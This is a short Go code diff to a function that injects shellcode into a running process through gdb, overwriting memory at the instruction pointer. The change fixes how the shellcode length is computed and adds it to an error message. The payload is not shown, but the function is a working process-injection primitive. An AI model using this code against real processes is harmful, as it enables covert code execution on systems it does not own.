@@ -5,6 +5,7 @@ import (
 	"io/ioutil"
 	"os/exec"
 	"strconv"
+	"strings"
 )
 
 // GDBInjectShellcode inject shellcode to a running process using GDB
@@ -28,11 +29,11 @@ func GDBInjectShellcode(pid int) error {
 	if err != nil {
 		return err
 	}
-	shellcodeLen := len(shellcode)
+	shellcodeLen := strings.Count(string(shellcode), "0x")
 
 	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
 	if err != nil {
-		return fmt.Errorf("GDB failed: %s\n%v", out, err)
+		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
 	}
 
 	return nil
